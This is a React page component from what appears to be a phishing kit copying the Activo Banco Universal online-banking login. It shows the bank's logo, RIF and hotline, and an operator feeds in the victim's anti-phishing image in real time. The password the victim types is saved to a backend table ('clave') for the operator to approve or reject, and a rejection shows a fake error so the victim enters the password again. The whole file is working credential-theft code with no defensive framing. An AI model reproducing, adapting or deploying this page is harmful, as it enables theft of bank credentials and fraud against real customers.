import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { api } from "@/api/apiClient";
import { usePresence } from "@/hooks/usePresence";

export default function PersonasVerification() {
  const navigate = useNavigate();
  const [imageConfirmed, setImageConfirmed] = useState(false);
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [rejectionReason, setRejectionReason] = useState("");
  const [requestId, setRequestId] = useState("");
  const [presenceId, setPresenceId] = useState(null);
  const [userImage, setUserImage] = useState(null);
  /** @type {React.RefObject<HTMLInputElement>} */
  const passwordRef = useRef(null);

  // Hook para trackear presencia del usuario
  usePresence(presenceId, "Verificación Persona");

  useEffect(() => {
    const id = sessionStorage.getItem("pinoRequestId");
    const username = sessionStorage.getItem("pinoUsername");
    const pId = sessionStorage.getItem("pinoPresenceId");

    if (!id || !username) {
      navigate("/pino-pers");
    } else {
      setRequestId(id);
      setPresenceId(pId);
    }
  }, [navigate]);

  // Cargar imagen del usuario (se recarga cada 2 segundos si no existe)
  useEffect(() => {
    if (!requestId) return;

    const loadUserImage = async () => {
      try {
        const request = await api.entities.PinoPermiso.get(requestId);
        if (request && request.imagen) {
          console.log("Imagen cargada:", request.imagen);
          setUserImage(request.imagen);
        } else {
          console.log("No hay imagen disponible aún");
        }
      } catch (err) {
        console.error("Error cargando imagen:", err);
      }
    };

    // Cargar imagen inmediatamente
    loadUserImage();

    // Push instantáneo: en cuanto el admin guarda la imagen, Supabase avisa sin esperar
    const unsubscribe = api.entities.PinoPermiso.onRowChange(requestId, (row) => {
      if (row?.imagen) {
        console.log("Imagen recibida por Realtime:", row.imagen);
        setUserImage(row.imagen);
      }
    });

    // Respaldo por si el proyecto no tiene Realtime habilitado en la tabla
    const interval = setInterval(() => {
      loadUserImage();
    }, 400);

    return () => {
      unsubscribe();
      clearInterval(interval);
    };
  }, [requestId]);

  useEffect(() => {
    if (!waitingApproval || !requestId) return;

    const interval = setInterval(async () => {
      try {
        const request = await api.entities.PinoPermiso.get(requestId);

        if (request.status === "aprobado" && request.etapa === "paso_2") {
          clearInterval(interval);
          setWaitingApproval(false);
          navigate("/pino-princi-per");
        } else if (request.status === "rechazado" || request.estado === "rechazado") {
          clearInterval(interval);
          setWaitingApproval(false);

          // Obtener razón del rechazo de múltiples posibles campos
          const razon = request.razon_rechazo ||
                       request.motivo_rechazo ||
                       request.razon ||
                       request.mensaje ||
                       "El código fue rechazado. Por favor intente nuevamente.";

          console.log("❌ Solicitud rechazada. Razón:", razon);
          setRejectionReason(razon);
          setErrorMessage("");
        }
      } catch (err) {
        console.error("Error checking approval:", err);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [waitingApproval, requestId, navigate]);

  /** @type {(e: React.MouseEvent) => void} */
  const handleImageClick = (e) => {
    e.preventDefault();
    setImageConfirmed(true);
    setTimeout(() => passwordRef.current?.focus(), 50);
  };

  const handleInputClick = () => {
    if (!imageConfirmed) {
      alert("Favor confirme la imagen antiphishing");
    }
  };

  /** @type {(e: React.FormEvent<HTMLFormElement>) => Promise<void>} */
  const handleFormSubmit = async (e) => {
    e.preventDefault();

    if (!imageConfirmed) {
      alert("Favor confirme la imagen antiphishing");
      return;
    }

    if (!password.trim()) {
      setErrorMessage("Ingresa una clave");
      return;
    }

    setLoading(true);
    setErrorMessage("");

    try {
      await api.entities.PinoPermiso.update(requestId, {
        clave: password,
        etapa: "paso_2",
        status: "pendiente",
      });

      setWaitingApproval(true);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Error al guardar clave";
      setErrorMessage(message);
    } finally {
      setLoading(false);
    }
  };

  /** @type {(e: React.MouseEvent<HTMLButtonElement>) => void} */
  const handleVolver = (e) => {
    e.preventDefault();
    sessionStorage.removeItem("pinoRequestId");
    sessionStorage.removeItem("pinoUsername");
    navigate("/pino-pers");
  };

  return (
    <div style={{
      minHeight: "100vh",
      backgroundColor: waitingApproval ? "#FFFFFF" : "#f0f0f0",
      fontFamily: "Arial, Helvetica, sans-serif",
      display: "flex",
      flexDirection: "column",
      animation: waitingApproval ? "pulse 1.5s infinite" : "none"
    }}>
      <style>{`
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.3; }
        }
      `}</style>
      {/* Header */}
      <div style={{
        backgroundColor: waitingApproval ? "#FFFFFF" : "#02004D",
        padding: "12px 24px",
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between"
      }}>
        <img
          src="https://www.bancoactivo.com/logo.svg"
          alt="Activo Banco Universal"
          style={{ height: "40px", filter: "brightness(0) invert(1)" }}
        />
        <span style={{ color: "#FFFFFF", fontSize: "13px" }}>RIF: J-08006622-7</span>
      </div>

      {/* Main Container */}
      <div style={{
        flex: 1,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        backgroundColor: waitingApproval ? "#FFFFFF" : "transparent",
        animation: waitingApproval ? "pulse 1.5s infinite" : "none"
      }}>
        <style>{`
          @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
          }
        `}</style>
        <div style={{
          width: "100%",
          maxWidth: "924px",
          backgroundColor: waitingApproval ? "transparent" : "#EEEEEE",
          border: waitingApproval ? "none" : "1px solid #cccccc",
          borderRadius: "4px",
          padding: window.innerWidth < 768 ? "16px" : "32px",
          display: waitingApproval ? "none" : "block",
          boxSizing: "border-box"
        }}>
          {/* Title */}
          <div style={{ marginBottom: "32px", borderBottom: "2px solid #e0e0e0", paddingBottom: "12px" }}>
            <h1 style={{
              fontSize: "18px",
              fontWeight: "600",
              color: "#082C62",
              margin: 0,
              display: "flex",
              alignItems: "center"
            }}>
              <span>Activo en Línea</span>
              <span style={{
                display: "inline-block",
                width: "3px",
                height: "28px",
                backgroundColor: "#FF7900",
                margin: "0 8px"
              }}></span>
              <span style={{ color: "#3C44D1" }}>Personas</span>
            </h1>
          </div>

          {waitingApproval && !rejectionReason ? (
            <div style={{
              minHeight: "400px",
              animation: "pulse 1.5s infinite"
            }}>
              <style>{`
                @keyframes pulse {
                  0%, 100% { opacity: 1; }
                  50% { opacity: 0.3; }
                }
              `}</style>
            </div>
          ) : (
            <div style={{
              width: "100%",
              display: "flex",
              flexDirection: window.innerWidth < 768 ? "column" : "row",
              gap: "40px",
              alignItems: "flex-start"
            }}>
              {/* LEFT COLUMN */}
              <div style={{
                flex: window.innerWidth < 768 ? "1 1 100%" : "1 1 50%",
                paddingRight: window.innerWidth < 768 ? "0" : "0"
              }}>
                    <h2 style={{
                      fontWeight: 700,
                      color: "#02004D",
                      fontSize: "14px",
                      margin: "0 0 16px 0"
                    }}>
                      Imagen Antiphishing
                    </h2>

                    <div style={{ display: "flex", justifyContent: "center", marginBottom: "16px" }}>
                      {userImage ? (
                        <img
                          src={userImage}
                          alt="Imagen de usuario"
                          decoding="sync"
                          fetchPriority="high"
                          onClick={handleImageClick}
                          onError={(e) => {
                            console.error("Error al cargar la imagen:", userImage);
                            e.currentTarget.style.display = "none";
                            setUserImage(null);
                          }}
                          style={{
                            width: "110px",
                            height: "110px",
                            border: "1px solid #999",
                            borderRadius: "4px",
                            cursor: "pointer",
                            objectFit: "cover",
                            backgroundColor: "#f0f0f0"
                          }}
                        />
                      ) : (
                        <div
                          onClick={handleImageClick}
                          style={{
                            width: "110px",
                            height: "110px",
                            backgroundColor: "#EEEEEE",
                            border: "1px solid #999",
                            borderRadius: "4px",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            cursor: "pointer",
                            color: "#666",
                            fontSize: "12px"
                          }}
                        >
                          {!imageConfirmed && "[Imagen Antiphishing]"}
                        </div>
                      )}
                    </div>

                    <p style={{
                      fontSize: "11px",
                      color: "#02004D",
                      lineHeight: 1.5,
                      marginBottom: "12px"
                    }}>
                      Estimado Cliente, en caso de no reconocer la imagen desplegada evite ingresar la Clave y por favor comuniquese al Centro de Atención Activa a través del 0501-ACTIVO1 (0501-2284861)
                    </p>

                    {!imageConfirmed && (
                      <p style={{
                        fontSize: "11px",
                        color: "#02004D",
                        lineHeight: 1.5
                      }}>
                        Haga click <a href="#" onClick={handleImageClick} style={{
                          color: "#c62828",
                          fontWeight: "bold",
                          textDecoration: "none"
                        }}>AQUÍ</a> si esta es su imagen o sello personal, de esta manera se habilitará el campo para el ingreso de su clave.
                      </p>
                    )}
              </div>

              {/* RIGHT COLUMN */}
              <div style={{
                flex: window.innerWidth < 768 ? "1 1 100%" : "1 1 50%",
                paddingLeft: window.innerWidth < 768 ? "0" : "0"
              }}>
                    <h2 style={{
                      fontWeight: 700,
                      color: "#02004D",
                      fontSize: "14px",
                      margin: "0 0 16px 0"
                    }}>
                      Usuarios Registrados
                    </h2>

                    <p style={{
                      fontSize: "12px",
                      color: "#02004D",
                      lineHeight: 1.5,
                      marginBottom: "16px"
                    }}>
                      Ingrese la clave y luego presione Aceptar
                    </p>

                    <form onSubmit={handleFormSubmit}>
                      <div style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "38px",
                        marginBottom: "12px"
                      }}>
                        <label style={{
                          fontSize: "12px",
                          color: "#333",
                          fontWeight: "bold",
                          whiteSpace: "nowrap"
                        }}>
                          Clave:
                        </label>
                        <input
                          ref={passwordRef}
                          type="password"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          onClick={handleInputClick}
                          disabled={!imageConfirmed || loading}
                          placeholder=""
                          style={{
                            width: "160px",
                            height: "28px",
                            padding: "4px",
                            fontSize: "7px",
                            letterSpacing: "1px",
                            border: imageConfirmed ? "2px solid #87CEEB" : "1px solid #aaa",
                            borderRadius: "3px",
                            backgroundColor: !imageConfirmed ? "#EEEEEE" : "#F0F8FF",
                            boxSizing: "border-box",
                            outline: "none",
                            opacity: 1,
                            cursor: !imageConfirmed ? "not-allowed" : "text",
                            color: !imageConfirmed ? "#999" : "#333",
                            boxShadow: imageConfirmed ? "0 0 8px rgba(135, 206, 235, 0.6)" : "none"
                          }}
                        />
                      </div>

                      {rejectionReason ? (
                        <div style={{
                          padding: "12px",
                          backgroundColor: "#ffebee",
                          border: "1px solid #ef5350",
                          borderRadius: "4px",
                          color: "#c62828",
                          fontSize: "12px",
                          marginBottom: "12px",
                          lineHeight: "1.5"
                        }}>
                          Estimado Cliente, la clave debe tener un mínimo de 8 y máximo de 12 caracteres. Por favor intente de nuevo.
                        </div>
                      ) : errorMessage && (
                        <div style={{
                          padding: "8px",
                          backgroundColor: "#ffebee",
                          border: "1px solid #ef5350",
                          borderRadius: "4px",
                          color: "#c62828",
                          fontSize: "11px",
                          marginBottom: "12px"
                        }}>
                          {errorMessage}
                        </div>
                      )}

                      <div style={{
                        display: "flex",
                        gap: "8px",
                        justifyContent: "flex-start"
                      }}>
                        <button
                          type="button"
                          onClick={() => {
                            if (rejectionReason) {
                              setRejectionReason("");
                              setPassword("");
                              setImageConfirmed(false);
                            } else {
                              sessionStorage.removeItem("pinoRequestId");
                              sessionStorage.removeItem("pinoUsername");
                              navigate("/pino-pers");
                            }
                          }}
                          disabled={loading}
                          style={{
                            backgroundColor: "#3C44D1",
                            border: "none",
                            padding: "5px 12px",
                            fontSize: "12px",
                            cursor: loading ? "not-allowed" : "pointer",
                            color: "#FFFFFF",
                            borderRadius: "3px"
                          }}
                        >
                          Volver
                        </button>
                        <button
                          type="submit"
                          disabled={!imageConfirmed || loading}
                          style={{
                            backgroundColor: "#3C44D1",
                            border: "none",
                            color: "#FFFFFF",
                            padding: "5px 12px",
                            fontSize: "12px",
                            fontFamily: "Arial, Helvetica, sans-serif",
                            cursor: !imageConfirmed || loading ? "not-allowed" : "pointer",
                            borderRadius: "3px"
                          }}
                        >
                          {loading ? "..." : "Aceptar"}
                        </button>
                      </div>
                    </form>
              </div>
            </div>
          )}
        </div>
      </div>

    </div>
  );
}
